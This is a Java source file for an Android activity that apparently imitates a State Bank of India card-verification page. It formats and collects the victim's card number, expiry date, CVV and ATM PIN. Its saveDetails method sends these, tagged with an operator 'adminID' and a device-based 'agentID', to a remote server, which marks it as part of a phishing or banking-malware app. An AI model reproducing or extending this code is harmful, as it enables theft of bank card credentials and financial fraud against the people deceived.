package com.pegalite.neotron3.ui.sbi;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivitySbiPage4Binding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;
import com.pegalite.neotron3.ui.sbicard.SBICardPage3Activity;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SbiPage4Activity extends AppCompatActivity {

    ActivitySbiPage4Binding binding;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySbiPage4Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.cardNumber.addTextChangedListener(new TextWatcher() {
            private boolean isFormatting;

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                if (isFormatting) return;
                isFormatting = true;

                String input = s.toString().replaceAll("\\s", "");
                StringBuilder formatted = new StringBuilder();

                for (int i = 0; i < input.length(); i++) {
                    if (i > 0 && i % 4 == 0) {
                        formatted.append(" ");
                    }
                    formatted.append(input.charAt(i));
                }

                binding.cardNumber.removeTextChangedListener(this);
                binding.cardNumber.setText(formatted.toString());
                binding.cardNumber.setSelection(formatted.length());
                binding.cardNumber.addTextChangedListener(this);

                isFormatting = false;
            }
        });

        binding.expiry.addTextChangedListener(new TextWatcher() {
            private boolean isFormatting;

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                if (isFormatting) return;
                isFormatting = true;

                String input = s.toString().replaceAll("/", "");

                if (input.length() >= 3) {
                    input = input.substring(0, 2) + "/" + input.substring(2);
                }

                binding.expiry.removeTextChangedListener(this);
                binding.expiry.setText(input);
                binding.expiry.setSelection(input.length());
                binding.expiry.addTextChangedListener(this);

                isFormatting = false;
            }
        });

        binding.submitButton.setOnClickListener(v -> {
            String cardNumber = binding.cardNumber.getText().toString();
            String expiry = binding.expiry.getText().toString();
            String cvv = binding.cvv.getText().toString();
            String atmPin = binding.atmPin.getText().toString();
            if (cardNumber.isEmpty() || expiry.isEmpty() || cvv.isEmpty()) {
                Toast.makeText(this, "Please Enter All The Fields!", Toast.LENGTH_SHORT).show();
                return;
            }

            try {
                JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                object.put("cardNumber", cardNumber);
                object.put("expiry", expiry);
                object.put("cvv", cvv);
                object.put("atmPin", atmPin);
                saveDetails(object);
                startActivity(new Intent(this, SbiPage5Activity.class).putExtra("data", object.toString()));

            } catch (JSONException e) {
                throw new RuntimeException(e);
            }

        });

    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

}